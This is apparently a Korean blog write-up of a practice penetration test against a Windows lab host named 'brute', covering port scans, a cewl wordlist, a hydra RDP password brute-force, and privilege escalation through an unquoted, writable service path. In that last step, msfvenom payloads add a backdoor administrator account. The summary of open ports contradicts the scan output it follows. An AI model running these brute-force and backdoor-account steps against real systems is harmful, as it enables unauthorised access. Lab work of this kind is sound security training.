---
title: '[BHPT] Brute'
layout: post
date: 2026-11-09 12:00:00 +0900
---

# 4.brute 모의해킹

## 점검환경

분석 기간 | 호스트 이름 | IP주소 | 점검자
---|:---:|---:|---:
2025년 12월 5일 ~ 2025년 12월 6일 | brute | TARGET_IP | 진엽

## 모의해킹 수행 내용
### 정보 수집
대상 호스트의 아이피주소를 상대로 모든 TCP 포트들의 상태를 알아보기 위해 TCP SYN 스캔을 이용해 포트스캐닝을 진행했다.
```
└─$ sudo nmap -sS -p- --max-retries 1 -Pn -n --open TARGET_IP --min-rate 1500 -oA fullport
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-10 06:37 EST
Nmap scan report for TARGET_IP
Host is up (0.047s latency).
Not shown: 60311 closed tcp ports (reset), 5209 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9120/tcp  open  unknown
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49672/tcp open  unknown
49674/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 24.71 seconds

```
포트 스캔 결과 포트 21,22,111,139,445,2049,34099,39555,45451,47451,47235,48355이 열려있었고, 다른 포트들은 모두 닫히거나 필터링 된 상태였다. 해당 포트에서 어떤 종류의 네트워크 서비스들이 실행중인지 알아보기 위해 서비스 배너 그래빙과 Nmap 기본 스크립트를 이용해 더 자세한 정보 수집을 진행했다.
```
└─$ nmap -p 3389 -sV -sC -Pn -n --open TARGET_IP --min-rate 1000 -oA tcpDetailed
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-10 06:39 EST
Nmap scan report for TARGET_IP
Host is up (0.057s latency).

PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: BRUTE
|   NetBIOS_Domain_Name: BRUTE
|   NetBIOS_Computer_Name: BRUTE
|   DNS_Domain_Name: brute
|   DNS_Computer_Name: brute
|   Product_Version: 10.0.17763
|_  System_Time: 2025-12-10T11:40:35+00:00
|_ssl-date: 2025-12-10T11:40:35+00:00; +46s from scanner time.
| ssl-cert: Subject: commonName=brute
| Not valid before: 2025-12-09T11:33:04
|_Not valid after:  2026-06-10T11:33:04
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 46s, deviation: 0s, median: 45s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.13 seconds
```

nmap으로는 정보를 얻지 못하였으며, 웹을 접속하여 burpsuit를 통해 패킷에 minseok.kim 계정을 획득했음
![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-brute/image-3.png)


cewl을 이용하여 웹 크롤링을 통해 단어 추출.
```
┌──(kali㉿kali)-[~/Desktop/brute]
└─$ cewl TARGET_IP  | tee password.txt
CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
.
.
.
[REDACTED_PASSWORD]
name
Interestingly
weak
systems
effective
very
but
simple
keyring
key
every
attempting
```

minseok.kim계정과 추출한 단어 password.txt로 패스워드를 지정한 뒤 히드라로 패스워드 무차별 공격 시도.
```
└─$ hydra -l minseok.kim -P password.txt TARGET_IP rdp -V
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-10 06:58:26
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 126 login tries (l:1/p:126), ~32 tries per task
[DATA] attacking rdp://TARGET_IP:3389/
[ATTEMPT] target TARGET_IP - login "minseok.kim" - pass "CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninja/)" - 1 of 126 [child 0] (0/0)
.
.
.
[ATTEMPT] target TARGET_IP - login "minseok.kim" - pass "[REDACTED_PASSWORD]" - 114 of 126 [child 0] (0/0)
[ERROR] freerdp: The connection failed to establish.
[RE-ATTEMPT] target TARGET_IP - login "minseok.kim" - pass "most" - 114 of 126 [child 2] (0/0)
[ATTEMPT] target TARGET_IP - login "minseok.kim" - pass "name" - 115 of 126 [child 3] (0/0)
[ATTEMPT] target TARGET_IP - login "minseok.kim" - pass "Interestingly" - 116 of 126 [child 2] (0/0)
[ERROR] freerdp: The connection failed to establish.
[RE-ATTEMPT] target TARGET_IP - login "minseok.kim" - pass "was" - 116 of 126 [child 1] (0/0)
[ATTEMPT] target TARGET_IP - login "minseok.kim" - pass "weak" - 117 of 126 [child 1] (0/0)
[3389][rdp] account on TARGET_IP might be valid but account not active for remote desktop: login: minseok.kim password: [REDACTED_PASSWORD], continuing attacking the account.
```

### 초기 침투

위에서 눈에 띄는 [REDACTED_PASSWORD] 패스워드로 RDP접속 성공.
```
┌──(kali㉿kali)-[~/Desktop/brute]
└─$ xfreerdp3 /u:minseok.kim /p:'[REDACTED_PASSWORD]' /v:TARGET_IP /dynamic-resolution
[07:36:39:526] [848610:000cf2e4] [WARN][com.freerdp.client.x11] - [load_map_from_xkbfile]:     : keycode: 0x08 -> no RDP scancode found
[07:36:39:526] [848610:000cf2e4] [WARN][com.freerdp.client.x11] - [load_map_from_xkbfile]:     : keycode: 0x5D -> no RDP scancode found
[07:36:39:769] [848610:000cf2e4] [WARN][com.freerdp.crypto] - [verify_cb]: Certificate 
```

### 권한 상승

C:\Disk Mannagement/Disk Pulse Enterprise/bin.diskpls.exe 실행파일이 ""로 묶여있지 않으며 띄어쓰기가 되어있는 것을 확인함.
또한 디렉토리 권한 체크 하여 builtin\users 그룹이 쓰기 권한 "W"을 가지고 있는 것을 확인함.
마지막으로 접속한 계정으로 시스템으 재시작할 수 있는지 확인함.
![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-brute/image.png)

msfvenom을 통해 사용자 계정 추가 및 관리자 그룹에 추가하는 페이로드를 제작함.
```
msfvenom -p windows/x64/exec CMD="net user jjjj Qhdks00! /add" -f exe-service -o Disk.exe
msfvenom -p windows/x64/exec CMD="net localgroup Administrators jjjj /add" -f exe-service -o Disk.exe
```
익스플로잇 페이로드가 2개이며 순차적으로 certutil.exe을 통해 공격자 서버에서 다운로드 후 서비스 재시작.
![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-brute/image-1.png)

익스플로잇을 통해 생성한 jjjj계정에 접속 후 관리자 그룹에 속해있는지 확인함.
![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-brute/image-2.png)

